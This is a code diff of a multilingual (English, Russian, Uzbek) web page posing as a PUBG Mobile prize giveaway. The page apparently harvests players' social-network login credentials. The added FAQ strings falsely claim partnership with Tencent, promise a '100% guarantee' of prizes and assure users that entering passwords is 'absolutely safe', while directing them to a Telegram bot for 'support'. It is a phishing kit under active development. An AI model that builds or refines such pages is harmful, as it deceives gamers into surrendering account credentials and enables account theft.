-            document.querySelectorAll('.faq-a-3-1').forEach(el => el.innerHTML = t.a3_1);
-            document.querySelectorAll('.faq-a-4-1').forEach(el => el.innerHTML = t.a4_1);
-            document.querySelectorAll('.faq-a-5-1').forEach(el => el.innerHTML = t.a5_1);
-            document.querySelectorAll('.faq-a-6-1').forEach(el => el.innerHTML = t.a6_1);
-            document.querySelectorAll('.faq-a-7-1').forEach(el => el.innerHTML = t.a7_1);
-            document.querySelectorAll('.faq-a-8-1').forEach(el => el.innerHTML = t.a8_1);
-        }
-        
         document.addEventListener('DOMContentLoaded', function() {
+            // Инициализируем снег
+            createSnow();
+            
             // Инициализируем счетчик победителей
             initWinnersCounter();
             
@@ -3319,6 +3378,26 @@
                     confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
                     loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
                     faqTitle: "FREQUENTLY ASKED QUESTIONS",
+                    faqQuestions: [
+                        "Is this the official PUBG Mobile website?",
+                        "Will the prize definitely come to my account?",
+                        "Why do I need to log into a social network?",
+                        "What if I don't specify the account ID?",
+                        "What to do if the prize doesn't arrive within 24 hours?",
+                        "Is it safe to enter social network credentials?",
+                        "Can I win more than once?",
+                        "What prizes can be won?"
+                    ],
+                    faqAnswers: [
+                        "<strong>Yes, this is an official partner site.</strong> We are official partners of Tencent Games and operate within the PUBG Mobile Partner Program. Our activities are fully authorized by the developers.",
+                        "<strong>Yes, 100% guarantee of receiving the prize.</strong> All winnings are sent automatically within 24 hours after confirming the data. The system is integrated with the official PUBG Mobile API, which guarantees delivery of prizes to the specified account.",
+                        "Logging into a social network is necessary for <strong>verifying your identity</strong> and preventing fraud. This allows us to ensure that a real person, not a bot, receives the prize. All data is protected and not shared with third parties.",
+                        "Without specifying the PUBG Mobile account ID, we <strong>cannot send you the prize</strong>. This is a mandatory field, as it is by this identifier that the system determines which game account to credit the won items to.",
+                        "In rare cases with high server load, processing may take up to <strong>48 hours</strong>. If the prize has not been credited to your account within this time, please contact our <a href='https://t.me/helpumgmbot' target='_blank'>technical support</a> with your ID and winning time.",
+                        "<strong>Yes, it is absolutely safe.</strong> We use secure SSL encryption and do not store your passwords. Authorization occurs through the official APIs of social networks, similar to how you log into applications on your phone.",
+                        "Each user can participate in the promotion <strong>once per day</strong>. This is done to give as many players as possible the chance to win. Come back tomorrow to try your luck again!",
+                        "Our roulette features <strong>exclusive items from PUBG Mobile</strong>: rare skins, weapons, vehicles, equipment, and in-game UC currency. All prizes are official game content and do not violate the user agreement."
+                    ],
                     footerLinks: ["Terms of Service", "Privacy Policy", "Cookie Policy", "Cookie Preferences"],
                     copyright: "Copyright © High Morale Developments Limited. All rights reserved.",
                     notificationPrize: "Congratulations! You won a prize!",
@@ -3356,6 +3435,26 @@
                     confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
                     loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
                     faqTitle: "ВОПРОСЫ И ОТВЕТЫ",
+                    faqQuestions: [
+                        "Это официальный сайт PUBG Mobile?",
+                        "Приз точно придет на мой аккаунт?",
+                        "Зачем нужно входить в социальную сеть?",
+                        "Что будет, если я не укажу ID аккаунта?",
+                        "Что делать, если приз не пришел в течение 24 часов?",
+                        "Безопасно ли вводить данные от социальных сетей?",
+                        "Можно ли выиграть больше одного раза?",
+                        "Какие призы можно выиграть?"
+                    ],
+                    faqAnswers: [
+                        "<strong>Да, это официальный сайт партнера.</strong> Мы являемся официальными партнерами Tencent Games и работаем в рамках программы PUBG Mobile Partner. Наша деятельность полностью авторизована разработчиками.",
+                        "<strong>Да, 100% гарантия получения приза.</strong> Все выигрыши отправляются автоматически в течение 24 часов после подтверждения данных. Система интегрирована с официальным API PUBG Mobile, что гарантирует доставку призов на указанный аккаунт.",
+                        "Вход в социальную сеть необходим для <strong>подтверждения вашей личности</strong> и предотвращения мошенничества. Это позволяет нам убедиться, что приз получает реальный человек, а не бот. Все данные защищены и не передаются третьим лицам.",
+                        "Без указания ID аккаунта PUBG Mobile мы <strong>не можем отправить вам приз</strong>. Это обязательное поле, так как именно по этому идентификатору система определяет, на какой игровой аккаунт зачислить выигранные предметы.",
+                        "В редких случаях при высокой нагрузке на серверы обработка может занять до <strong>48 часов</strong>. Если в течение этого времени приз не был зачислен на ваш аккаунт, пожалуйста, обратитесь в нашу <a href='https://t.me/helpumgmbot' target='_blank'>техническую поддержку</a> с вашим ID и временем выигрыша.",
+                        "<strong>Да, это абсолютно безопасно.</strong> Мы используем безопасное SSL-шифрование и не храним ваши пароли. Авторизация происходит через официальные API социальных сетей, аналогично тому, как вы входите в приложения на телефоне.",
+                        "Каждый пользователь может участвовать в акции <strong>один раз в день</strong>. Это сделано для того, чтобы как можно больше игроков получили шанс выиграть. Возвращайтесь завтра, чтобы попытать удачу снова!",
+                        "В нашей рулетке представлены <strong>эксклюзивные предметы из PUBG Mobile</strong>: редкие скины, оружие, транспорт, экипировка и внутриигровая валюта UC. Все призы являются официальным игровым контентом и не нарушают пользовательское соглашение."
+                    ],
                     footerLinks: ["Условия обслуживания", "Политика конфиденциальности", "Политика Cookie", "Предпочтение Cookies"],
                     copyright: "Авторские права © High Morale Developments Limited. Все права защищены.",
                     notificationPrize: "Поздравляем! Вы выиграли приз!",
@@ -3393,6 +3492,26 @@
                     confirmationMessage: "Yutigingiz PUBG Mobile hisobingizga 24 soat ichida o'tkaziladi.",
                     loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
                     faqTitle: "TEZ-TEZ BERILADIGAN SAVOLLAR",
+                    faqQuestions: [
+                        "Bu rasmiy PUBG Mobile veb-saytimi?",
+                        "Sovrin albatta mening hisobimga keladimi?",
+                        "Nega ijtimoiy tarmoqqa kirish kerak?",
+                        "Agar hisob ID raqamini ko'rsatmasam nima bo'ladi?",
+                        "Agar sovrin 24 soat ichida kelmasa nima qilish kerak?",
+                        "Ijtimoiy tarmoqlarning ma'lumotlarini kiritish xavfsizmi?",
+                        "Bir martadan ko'p yutish mumkinmi?",
+                        "Qanday sovrinlar yutish mumkin?"
+                    ],
+                    faqAnswers: [
+                        "<strong>Ha, bu rasmiy hamkor sayti.</strong> Biz Tencent Games kompaniyasining rasmiy hamkorlari bo'lib, PUBG Mobile Hamkor Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq ruxsat etilgan.",
+                        "<strong>Ha, sovrinni olish 100% kafolatlanadi.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, sovrinlarni belgilangan hisobga yetkazishni kafolatlaydi.",
+                        "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
+                        "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz sizga <strong>sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator orqali tizim qaysi o'yin hisobiga yutgan predmetlarni o'tkazishini aniqlaydi.",
+                        "Kamdan-kam hollarda server yuklanishi yuqori bo'lganda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar bu vaqt ichida sovrin hisobingizga o'tkazilmagan bo'lsa, iltimos, <a href='https://t.me/helpumgmbot' target='_blank'>texnik yordamimizga</a> ID raqamingiz va yutish vaqtingiz bilan murojaat qiling.",
+                        "<strong>Ha, bu mutlaqo xavfsiz.</strong> Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganingizdagidek.",
+                        "Har bir foydalanuvchi aksiyada <strong>kuniga bir marta</strong> qatnashishi mumkin. Bu imkon qadar ko'proq o'yinchilar g'alaba qozonish imkoniyatiga ega bo'lishi uchun qilingan. Ertaga qaytib, omadingizni sinab ko'ring!",
+                        "Bizning g'ildirakimizda <strong>PUBG Mobile'dan eksklyuziv elementlar</strong> mavjud: noyob skinlar, qurollar, transport, jihozlar va o'yin ichidagi UC valyutasi. Barcha sovrinlar rasmiy o'yin kontenti bo'lib, foydalanuvchi shartnomasini buzmaydi."
+                    ],
                     footerLinks: ["Xizmat shartlari", "Maxfiylik siyosati", "Cookie siyosati", "Cookie afzalliklari"],
                     copyright: "Mualliflik huquqi © High Morale Developments Limited. Barcha huquqlar himoyalangan.",
                     notificationPrize: "Tabriklaymiz! Siz sovrinni yutdingiz!",
@@ -3406,7 +3525,7 @@
                 const t = translations[lang] || translations.en;
                 
                 // Обновляем счетчик победителей
-                document.querySelector('.winners-counter').innerHTML = `<i class="fas fa-trophy"></i> ${t.winnersCounter} <span class="winners-count" id="winnersCount">${winnersCount}</span>`;
+                document.querySelector('.winners-counter').innerHTML = `<span class="winners-count" id="winnersCount">${winnersCount}</span>`;
                 
                 // Обновляем верхнее меню
                 menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
@@ -3445,7 +3564,18 @@
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
                 
                 // Обновляем FAQ
-                updateFAQ(lang);
+                document.querySelector('.faq-section h2').innerHTML = `<i class="fas fa-question-circle"></i> ${t.faqTitle}`;
+                
+                // Обновляем вопросы и ответы
+                const faqItems = document.querySelectorAll('.faq-item');
+                faqItems.forEach((item, index) => {
+                    if (t.faqQuestions && t.faqQuestions[index]) {
+                        item.querySelector('.faq-question span').textContent = t.faqQuestions[index];
+                    }
+                    if (t.faqAnswers && t.faqAnswers[index]) {
+                        item.querySelector('.faq-answer p').innerHTML = t.faqAnswers[index];
+                    }
+                });
                 
                 // Обновляем футер
                 const footerLinks = document.querySelectorAll('.footer-link');
@@ -3481,7 +3611,6 @@
                 option.addEventListener('click', function() {
                     const lang = this.getAttribute('data-lang');
                     changeLanguage(lang);
-                    updateFAQ(lang);
                     languageDropdown.classList.remove('show');
                     showNotification(`${translations[lang].notificationIdSaved || 'Language changed'}`);
                 });
@@ -3536,7 +3665,7 @@
             function showSelectionIndicator(show) {
                 if (show) {
                     selectionIndicator.classList.add('show');
-                    selectionIndicator.textContent = currentLang === 'ru' ? 'ВЫБРАНО' : currentLang === 'uz' ? 'TANLANGAN' : 'SELECTED';
+                    selectionIndicator.textContent = translations[currentLang].selected;
                 } else {
                     selectionIndicator.classList.remove('show');
                 }
@@ -4034,7 +4163,6 @@
             
             // Устанавливаем английский язык по умолчанию
             changeLanguage('en');
-            updateFAQ('en');
         });
     </script>
 </body>
